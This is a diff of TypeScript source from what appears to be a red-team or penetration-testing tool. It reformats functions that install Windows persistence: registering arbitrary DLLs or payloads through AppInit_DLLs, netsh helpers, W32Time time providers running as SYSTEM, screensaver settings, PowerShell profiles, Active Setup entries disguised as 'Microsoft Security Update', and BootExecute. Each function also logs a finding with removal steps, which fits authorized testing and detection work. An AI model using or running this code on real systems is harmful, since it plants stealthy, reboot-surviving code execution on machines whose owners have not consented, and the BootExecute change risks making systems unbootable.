+          details: "DLL injected into every User32 process. Persists across reboots.",
+          remediation: `Remove: reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "" /f`,
+        })
     }
     if (action === "remove") {
-      if (!dll) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
+      if (!dll) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
       const current = await cmd(`reg query "${regPathCmd}" /v "AppInit_DLLs"`, timeout)
       const curVal = current.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || ""
-      const newVal = curVal.split(" ").filter((d: string) => d !== dll).join(" ")
+      const newVal = curVal
+        .split(" ")
+        .filter((d: string) => d !== dll)
+        .join(" ")
       await cmd(`reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "${newVal}" /f`, timeout)
       if (!newVal.trim()) await cmd(`reg add "${regPathCmd}" /v "LoadAppInit_DLLs" /t REG_DWORD /d 0 /f`, timeout)
       output.push(`[+] Removed ${dll} from AppInit_DLLs`)
@@ -3704,17 +4218,42 @@ export async function netshHelper(args: string[], timeout: number): Promise<Hook
     if (action === "enum") {
       const r = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\NetSh"`, timeout)
       output.push("[*] Registered netsh helpers:\n" + (r.stdout || "(none)"))
-      output.push("\n[*] Known Microsoft helpers: dhcpclient, dot3cfg, fwcfg, hnetmon, ifmon, napmontr, netiohlp, nshhttp, nshipsec, nshwfp, ras, rpcnsh, whhelper, wshelper")
+      output.push(
+        "\n[*] Known Microsoft helpers: dhcpclient, dot3cfg, fwcfg, hnetmon, ifmon, napmontr, netiohlp, nshhttp, nshipsec, nshwfp, ras, rpcnsh, whhelper, wshelper",
+      )
     }
     if (action === "install") {
-      if (!dll) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
-      const r = await cmd(`reg add "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${helperName}" /t REG_SZ /d "${dll}" /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Netsh helper registered: ${helperName} → ${dll}\n[*] DLL loads on next netsh invocation\n[*] Also triggered by gpupdate (Group Policy refresh)` : `[!] Failed: ${r.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-NTSH-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `netsh://${helperName}`, title: `Netsh helper: ${helperName} → ${dll}`, details: "DLL loads on every netsh invocation. Persists across reboots.", remediation: `Remove: reg delete "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${helperName}" /f` })
+      if (!dll) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
+      const r = await cmd(
+        `reg add "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${helperName}" /t REG_SZ /d "${dll}" /f`,
+        timeout,
+      )
+      output.push(
+        r.exitCode === 0
+          ? `[+] Netsh helper registered: ${helperName} → ${dll}\n[*] DLL loads on next netsh invocation\n[*] Also triggered by gpupdate (Group Policy refresh)`
+          : `[!] Failed: ${r.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-NTSH-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `netsh://${helperName}`,
+          title: `Netsh helper: ${helperName} → ${dll}`,
+          details: "DLL loads on every netsh invocation. Persists across reboots.",
+          remediation: `Remove: reg delete "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${helperName}" /f`,
+        })
     }
     if (action === "remove") {
       const name = argVal(args, "--name")
-      if (!name) { output.push("ERROR: --name required"); return { output: output.join("\n"), findings } }
+      if (!name) {
+        output.push("ERROR: --name required")
+        return { output: output.join("\n"), findings }
+      }
       const r = await cmd(`reg delete "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${name}" /f`, timeout)
       output.push(r.exitCode === 0 ? `[+] Netsh helper '${name}' removed` : `[!] Failed: ${r.stderr}`)
     }
@@ -3862,19 +4401,39 @@ export async function timeProvider(args: string[], timeout: number): Promise<Hoo
       output.push("\n[*] Known providers: NtpClient, NtpServer, VMICTimeProvider")
     }
     if (action === "install") {
-      if (!dll) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
+      if (!dll) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
       const provPath = `${regBaseCmd}\\${providerName}`
       await cmd(`reg add "${provPath}" /v "DllName" /t REG_SZ /d "${dll}" /f`, timeout)
       await cmd(`reg add "${provPath}" /v "Enabled" /t REG_DWORD /d 1 /f`, timeout)
       const r = await cmd(`reg add "${provPath}" /v "InputProvider" /t REG_DWORD /d 1 /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Time provider registered: ${providerName}\n    DLL: ${dll}` : `[!] Failed: ${r.stderr}`)
+      output.push(
+        r.exitCode === 0 ? `[+] Time provider registered: ${providerName}\n    DLL: ${dll}` : `[!] Failed: ${r.stderr}`,
+      )
       const restart = await cmd("net stop W32Time && net start W32Time", timeout)
-      output.push(restart.exitCode === 0 ? "[+] W32Time restarted — DLL loaded as SYSTEM" : `[!] Restart: ${restart.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-TIME-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `w32time://${providerName}`, title: `Time provider: ${providerName} → ${dll}`, details: "Runs as SYSTEM in W32Time service. Rarely audited.", remediation: `Remove: reg delete "${provPath}" /f` })
+      output.push(
+        restart.exitCode === 0 ? "[+] W32Time restarted — DLL loaded as SYSTEM" : `[!] Restart: ${restart.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-TIME-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `w32time://${providerName}`,
+          title: `Time provider: ${providerName} → ${dll}`,
+          details: "Runs as SYSTEM in W32Time service. Rarely audited.",
+          remediation: `Remove: reg delete "${provPath}" /f`,
+        })
     }
     if (action === "remove") {
       const name = argVal(args, "--name")
-      if (!name) { output.push("ERROR: --name required"); return { output: output.join("\n"), findings } }
+      if (!name) {
+        output.push("ERROR: --name required")
+        return { output: output.join("\n"), findings }
+      }
       const r = await cmd(`reg delete "${regBaseCmd}\\${name}" /f`, timeout)
       output.push(r.exitCode === 0 ? `[+] Time provider '${name}' removed` : `[!] Failed: ${r.stderr}`)
       await cmd("net stop W32Time && net start W32Time", timeout)
@@ -4055,13 +4614,30 @@ export async function screensaverPersist(args: string[], timeout: number): Promi
       output.push("[*] No admin required — per-user HKCU persistence")
     }
     if (action === "install") {
-      if (!payload) { output.push("ERROR: --payload required"); return { output: output.join("\n"), findings } }
+      if (!payload) {
+        output.push("ERROR: --payload required")
+        return { output: output.join("\n"), findings }
+      }
       await cmd(`reg add "${regPathCmd}" /v "SCRNSAVE.EXE" /t REG_SZ /d "${payload}" /f`, timeout)
       await cmd(`reg add "${regPathCmd}" /v "ScreenSaveActive" /t REG_SZ /d "1" /f`, timeout)
       await cmd(`reg add "${regPathCmd}" /v "ScreenSaveTimeOut" /t REG_SZ /d "${ssTimeout}" /f`, timeout)
       const r = await cmd(`reg add "${regPathCmd}" /v "ScreenSaverIsSecure" /t REG_SZ /d "0" /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Screensaver set: ${payload}\n[+] Timeout: ${ssTimeout}s\n[*] Runs as current user when idle` : `[!] Failed: ${r.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-SCRN-010", provider: "windows", severity: "high", status: "PERSISTED", resource: "screensaver://hkcu", title: `Screensaver persistence: ${payload} (${ssTimeout}s)`, details: "Runs as current user on idle. No admin required.", remediation: `Remove: reg delete "${regPathCmd}" /v "SCRNSAVE.EXE" /f` })
+      output.push(
+        r.exitCode === 0
+          ? `[+] Screensaver set: ${payload}\n[+] Timeout: ${ssTimeout}s\n[*] Runs as current user when idle`
+          : `[!] Failed: ${r.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-SCRN-010",
+          provider: "windows",
+          severity: "high",
+          status: "PERSISTED",
+          resource: "screensaver://hkcu",
+          title: `Screensaver persistence: ${payload} (${ssTimeout}s)`,
+          details: "Runs as current user on idle. No admin required.",
+          remediation: `Remove: reg delete "${regPathCmd}" /v "SCRNSAVE.EXE" /f`,
+        })
     }
     if (action === "remove") {
       await cmd(`reg delete "${regPathCmd}" /v "SCRNSAVE.EXE" /f`, timeout)
@@ -4236,18 +4812,41 @@ export async function powershellProfile(args: string[], timeout: number): Promis
       for (const p of profiles) {
         const r = await cmd(`if exist "${p.path}" (echo EXISTS & type "${p.path}") else (echo NONE)`, timeout)
         output.push(`[*] ${p.name}: ${r.stdout.includes("EXISTS") ? "EXISTS" : "NONE"}`)
-        if (r.stdout.includes("EXISTS")) output.push(`    ${p.path}\n    Content:\n${r.stdout.replace("EXISTS\r\n", "").substring(0, 500)}`)
+        if (r.stdout.includes("EXISTS"))
+          output.push(`    ${p.path}\n    Content:\n${r.stdout.replace("EXISTS\r\n", "").substring(0, 500)}`)
       }
-      const policy = await cmd("reg query HKCU\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /v ExecutionPolicy", timeout)
+      const policy = await cmd(
+        "reg query HKCU\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /v ExecutionPolicy",
+        timeout,
+      )
       output.push(`\n[*] Execution Policy: ${policy.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "not set"}`)
     }
     if (action === "install") {
-      if (!payload) { output.push("[!] --payload required"); return { output: output.join("\n"), findings } }
+      if (!payload) {
+        output.push("[!] --payload required")
+        return { output: output.join("\n"), findings }
+      }
       const dir = targetProfile.replace(/\\[^\\]+$/, "")
       await cmd(`if not exist "${dir}" mkdir "${dir}"`, timeout)
-      const r = await cmd(`echo # Windows PowerShell compatibility module >> "${targetProfile}" && echo ${payload.replace(/&/g, "^&").replace(/>/g, "^>").replace(/</g, "^<")} >> "${targetProfile}"`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Profile persistence installed\n    Profile: ${targetProfile}\n    Payload runs on every PS session start` : `[!] Failed: ${r.stderr}`)
-      findings.push({ checkId: "WIN-PERSIST-022", provider: "windows", severity: "high", status: r.exitCode === 0 ? "EXECUTED" : "FAILED", resource: "profile://powershell", title: "PowerShell profile persistence", details: `Scope: ${scope}, Payload: ${payload.substring(0, 100)}`, remediation: "Monitor profile files. Use -NoProfile in automated scripts." })
+      const r = await cmd(
+        `echo # Windows PowerShell compatibility module >> "${targetProfile}" && echo ${payload.replace(/&/g, "^&").replace(/>/g, "^>").replace(/</g, "^<")} >> "${targetProfile}"`,
+        timeout,
+      )
+      output.push(
+        r.exitCode === 0
+          ? `[+] Profile persistence installed\n    Profile: ${targetProfile}\n    Payload runs on every PS session start`
+          : `[!] Failed: ${r.stderr}`,
+      )
+      findings.push({
+        checkId: "WIN-PERSIST-022",
+        provider: "windows",
+        severity: "high",
+        status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
+        resource: "profile://powershell",
+        title: "PowerShell profile persistence",
+        details: `Scope: ${scope}, Payload: ${payload.substring(0, 100)}`,
+        remediation: "Monitor profile files. Use -NoProfile in automated scripts.",
+      })
     }
     if (action === "remove") {
       output.push("[*] To remove, edit the profile manually:")
@@ -4429,14 +5028,31 @@ export async function activeSetup(args: string[], timeout: number): Promise<Hook
       output.push("[*] Executed BEFORE Explorer shell — very early execution")
     }
     if (action === "install") {
-      if (!payload) { output.push("[!] --payload required"); return { output: output.join("\n"), findings } }
+      if (!payload) {
+        output.push("[!] --payload required")
+        return { output: output.join("\n"), findings }
+      }
       const guid = `{${name.replace(/\./g, "-")}}`
       const guidPath = `${regPathCmdBase}\\${guid}`
       await cmd(`reg add "${guidPath}" /ve /t REG_SZ /d "Microsoft Security Update" /f`, timeout)
       await cmd(`reg add "${guidPath}" /v "StubPath" /t REG_SZ /d "${payload}" /f`, timeout)
       const r = await cmd(`reg add "${guidPath}" /v "Version" /t REG_SZ /d "1,0,0,1" /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Active Setup installed\n    GUID: ${guid}\n    StubPath: ${payload}\n    Version: 1,0,0,1\n[*] Executes once per user at next logon` : `[!] Failed: ${r.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-PERSIST-024", provider: "windows", severity: "high", status: "EXECUTED", resource: `registry://active-setup/${guid}`, title: `Active Setup persistence: ${guid}`, details: `Payload: ${payload}`, remediation: `Remove: reg delete "${guidPath}" /f` })
+      output.push(
+        r.exitCode === 0
+          ? `[+] Active Setup installed\n    GUID: ${guid}\n    StubPath: ${payload}\n    Version: 1,0,0,1\n[*] Executes once per user at next logon`
+          : `[!] Failed: ${r.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PERSIST-024",
+          provider: "windows",
+          severity: "high",
+          status: "EXECUTED",
+          resource: `registry://active-setup/${guid}`,
+          title: `Active Setup persistence: ${guid}`,
+          details: `Payload: ${payload}`,
+          remediation: `Remove: reg delete "${guidPath}" /f`,
+        })
     }
     if (action === "remove") {
       const guid = `{${name.replace(/\./g, "-")}}`
@@ -4597,15 +5213,42 @@ export async function bootExec(args: string[], timeout: number): Promise<HookRes
       output.push("[*] Default: 'autocheck autochk *'")
       output.push("[*] Must be native executables in %SystemRoot%\\System32")
       const isCustom = r.stdout && !r.stdout.match(/autocheck\s+autochk\s+\*/i)
-      findings.push({ checkId: "WIN-PERSIST-025", provider: "windows", severity: isCustom ? "critical" : "info", status: "ENUMERATED", resource: "registry://boot-execute", title: "BootExecute early boot check", details: r.stdout?.substring(0, 300) || "Query failed", remediation: "Only 'autocheck autochk *' should be present." })
+      findings.push({
+        checkId: "WIN-PERSIST-025",
+        provider: "windows",
+        severity: isCustom ? "critical" : "info",
+        status: "ENUMERATED",
+        resource: "registry://boot-execute",
+        title: "BootExecute early boot check",
+        details: r.stdout?.substring(0, 300) || "Query failed",
+        remediation: "Only 'autocheck autochk *' should be present.",
+      })
     }
     if (action === "install") {
-      if (!payload) { output.push("[!] --payload required — must be native exe in System32"); return { output: output.join("\n"), findings } }
+      if (!payload) {
+        output.push("[!] --payload required — must be native exe in System32")
+        return { output: output.join("\n"), findings }
+      }
       const current = await cmd(`reg query "${smKey}" /v "BootExecute"`, timeout)
-      const curVal = current.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || "autocheck autochk *"
+      const curVal =
+        current.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || "autocheck autochk *"
       const r = await cmd(`reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "${curVal}\\0${payload}" /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] BootExecute entry added: ${payload}\n[!!!] WARNING: Invalid binary may prevent boot\n[*] Effective on next reboot` : `[!] Failed: ${r.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-PERSIST-026", provider: "windows", severity: "critical", status: "EXECUTED", resource: "registry://boot-execute", title: "BootExecute persistence installed", details: `Payload: ${payload}`, remediation: `Remove from BootExecute. Restore: reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *" /f` })
+      output.push(
+        r.exitCode === 0
+          ? `[+] BootExecute entry added: ${payload}\n[!!!] WARNING: Invalid binary may prevent boot\n[*] Effective on next reboot`
+          : `[!] Failed: ${r.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PERSIST-026",
+          provider: "windows",
+          severity: "critical",
+          status: "EXECUTED",
+          resource: "registry://boot-execute",
+          title: "BootExecute persistence installed",
+          details: `Payload: ${payload}`,
+          remediation: `Remove from BootExecute. Restore: reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *" /f`,
+        })
     }
     if (action === "remove") {
       const r = await cmd(`reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *" /f`, timeout)
